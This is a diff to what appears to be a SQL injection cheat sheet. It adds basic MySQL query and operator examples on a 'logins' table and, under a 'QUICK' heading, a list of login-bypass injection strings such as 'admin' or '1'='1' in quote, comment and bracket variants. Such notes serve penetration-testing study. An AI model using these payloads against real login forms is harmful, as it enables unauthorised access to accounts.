@@ -35,6 +35,25 @@ mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
 mysql> ALTER TABLE logins MODIFY newerColumn DATE;
 mysql> ALTER TABLE logins DROP newerColumn;
 mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
+mysql> SELECT * FROM logins ORDER BY password;
+mysql> SELECT * FROM logins ORDER BY password ASC;
+mysql> SELECT * FROM logins ORDER BY password DESC;
+mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;
+mysql> SELECT * FROM logins LIMIT 2;
+mysql> SELECT * FROM logins LIMIT 1, 2;
+mysql> SELECT * FROM logins WHERE id > 1;
+mysql> SELECT * FROM logins where username = 'admin';
+mysql> SELECT * FROM logins WHERE username LIKE 'admin%';
+mysql> SELECT * FROM logins WHERE username like '___';
+MariaDB> select * from employees WHERE first_name LIKE 'Bar%' AND hire_date = '1990-01-01';
+mysql> SELECT 1 = 1 AND 'test' = 'test';
+mysql> SELECT 1 = 1 OR 'test' = 'abc';
+mysql> SELECT NOT 1 = 1;
+mysql> SELECT 1 = 1 && 'test' = 'abc';
+mysql> SELECT 1 = 1 || 'test' = 'abc';
+mysql> SELECT 1 != 1;
+mysql> SELECT * FROM logins WHERE username != 'john';
+mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
 ```
 
 ---
@@ -42,8 +61,13 @@ mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
 ### QUICK
 
 ```sql
+-- Use ' " # ; ) --
 ';#---              
 admin' or '1'='1
+admin" or '1'='1
+admin# or '1'='1
+admin; or '1'='1
+admin) or '1'='1
 ' or '1'='1
 " or "1"="1
 " or "1"="1"--
